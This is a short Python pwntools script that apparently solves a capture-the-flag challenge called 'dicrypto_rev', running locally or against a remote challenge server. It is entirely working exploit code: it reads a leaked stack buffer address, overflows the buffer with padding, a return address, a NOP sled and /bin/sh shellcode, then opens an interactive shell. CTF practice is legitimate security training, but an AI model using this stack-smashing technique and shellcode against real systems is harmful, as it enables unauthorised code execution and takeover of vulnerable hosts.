from pwn import *
from sys import *

context.arch = 'i386'

elf = ELF("./dicrypto_rev")
p = process("./dicrypto_rev")

HOST = "chall.agrihack-csi.com"
PORT = 17004

cmd = """
b*0x080493f0
"""

if(argv[1] == 'gdb'):
	gdb.attach(p,cmd)
elif(argv[1] == 'rm'):
	p = remote(HOST,PORT)

p.recvuntil(b'Buffer: ')
buffer = eval(p.recvline().rstrip())
print(hex(buffer))

shellcode = asm(shellcraft.sh())

payload = b'A'*128
payload += p32(buffer+128+4)
payload += b'\x90'*20
payload += shellcode
p.sendline(payload)
p.interactive()